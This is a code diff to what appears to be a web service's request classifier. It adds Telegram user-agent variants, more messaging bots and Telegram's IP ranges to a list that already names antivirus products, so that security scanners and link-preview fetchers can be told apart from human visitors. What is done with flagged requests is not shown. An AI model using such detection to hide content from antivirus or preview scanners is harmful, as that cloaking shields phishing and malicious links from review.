@@ -61,12 +61,29 @@ const SCANNER_PATTERNS: string[] = [
   // Antivirus
   'clamav', 'avg/', 'avast', 'avira', 'bitdefender', 'eset', 'f-secure',
   'comodo', 'checkpoint',
-  // Bots
-  'bingbot', 'slackbot', 'twitterbot', 'discordbot', 'whatsapp', 'telegrambot',
+  // Telegram (multiple UA variants)
+  'telegrambot', 'telegram', 'tg-url-preview', 'tg/', 'tgbot',
+  // Messaging bots
+  'bingbot', 'slackbot', 'twitterbot', 'discordbot', 'whatsapp',
+  'signal/', 'viber', 'skypeuripreview', 'line/',
   // Dev tools
   'httpie', 'node-fetch', 'powershell', 'axios', 'postmanruntime',
   // Generic
   'scanner', 'crawler', 'spider', 'bot/', 'bot;',
+];
+
+// Telegram URL preview IP ranges (IPv4 CIDRs)
+const TELEGRAM_IP_PREFIXES: string[] = [
+  '149.154.160.', '149.154.161.', '149.154.162.', '149.154.163.',
+  '149.154.164.', '149.154.165.', '149.154.166.', '149.154.167.',
+  '149.154.168.', '149.154.169.', '149.154.170.', '149.154.171.',
+  '149.154.172.', '149.154.173.', '149.154.174.', '149.154.175.',
+  '91.108.4.', '91.108.5.', '91.108.6.', '91.108.7.',
+  '91.108.8.', '91.108.9.', '91.108.10.', '91.108.11.',
+  '91.108.12.', '91.108.13.', '91.108.14.', '91.108.15.',
+  '91.108.16.', '91.108.17.', '91.108.18.', '91.108.19.',
+  '91.108.20.', '91.108.21.', '91.108.56.', '91.108.57.',
+  '95.161.64.',
 ];
 
 export function isHardBlocked(ua: string): boolean {
@@ -74,9 +91,12 @@ export function isHardBlocked(ua: string): boolean {
   return HARD_BLOCK_PATTERNS.some(p => lower.includes(p));
 }
 
-export function isScanner(ua: string): boolean {
+export function isScanner(ua: string, ip?: string): boolean {
   const lower = ua.toLowerCase();
-  return SCANNER_PATTERNS.some(p => lower.includes(p));
+  if (SCANNER_PATTERNS.some(p => lower.includes(p))) return true;
+  // Check Telegram IP ranges (catches requests with generic browser UA)
+  if (ip && TELEGRAM_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) return true;
+  return false;
 }
 
 function hashCode(s: string): number {
